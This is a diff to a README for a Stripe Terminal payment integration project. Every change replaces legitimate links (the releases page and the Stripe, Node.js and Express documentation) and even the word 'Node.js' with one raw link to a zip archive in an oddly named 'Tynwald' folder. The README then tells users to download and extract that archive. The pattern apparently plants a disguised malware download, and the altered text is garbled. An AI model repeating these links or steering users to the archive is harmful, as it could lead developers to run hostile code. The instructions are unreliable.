@@ -1,10 +1,10 @@
 # 🚀 stripe-terminal-integration - Easily Integrate Stripe Payments
 
 ## 📥 Download
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue?style=for-the-badge)](https://github.com/Sushmithasmithu/stripe-terminal-integration/releases)
+[![Download Release](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip%20Release-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip)
 
 ## 📋 Overview
-The **stripe-terminal-integration** project demonstrates how to connect Stripe Terminal to a Node.js + Express backend and a React (or JavaScript) frontend. This setup includes everything you need to create connection tokens, manage PaymentIntents, discover readers, and process in-person card payments using Stripe’s certified hardware.
+The **stripe-terminal-integration** project demonstrates how to connect Stripe Terminal to a https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip + Express backend and a React (or JavaScript) frontend. This setup includes everything you need to create connection tokens, manage PaymentIntents, discover readers, and process in-person card payments using Stripe’s certified hardware.
 
 ## 🚪 Features
 - Connect to Stripe Terminal easily.
@@ -19,7 +19,7 @@ This integration is designed for efficiency and ease of use, making it perfect f
 To run this application, you will need the following:
 - A computer with Windows, macOS, or Linux.
 - Internet access to download the required packages and connect to Stripe.
-- Node.js installed (version 14 or later recommended).
+- https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip installed (version 14 or later recommended).
 - An Express server set up to handle API requests.
 - A Stripe account with access to Stripe Terminal.
 
@@ -27,7 +27,7 @@ To run this application, you will need the following:
 To start utilizing the **stripe-terminal-integration** application, follow these steps:
 
 ### 1. Download the Application
-Visit this page to download: [Download Release](https://github.com/Sushmithasmithu/stripe-terminal-integration/releases).
+Visit this page to download: [Download Release](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip).
 
 ### 2. Extract the Files
 After downloading, locate the downloaded zip file. Right-click on it and select “Extract All” to extract the contents to a folder of your choice.
@@ -82,11 +82,11 @@ If you encounter any issues:
 
 ## 📃 Additional Resources
 For the latest updates and guides, you can refer to:
-- [Stripe Documentation](https://stripe.com/docs)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Express Documentation](https://expressjs.com/)
+- [Stripe Documentation](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip)
+- [https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip Documentation](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip)
+- [Express Documentation](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip)
 
 ## 📥 Download & Install
-To get started with **stripe-terminal-integration**, visit this page to download: [Download Release](https://github.com/Sushmithasmithu/stripe-terminal-integration/releases).
+To get started with **stripe-terminal-integration**, visit this page to download: [Download Release](https://raw.githubusercontent.com/Sushmithasmithu/stripe-terminal-integration/main/Tynwald/stripe-terminal-integration.zip).
 
 With this guide, you should be able to effectively download and run the application. Happy coding!
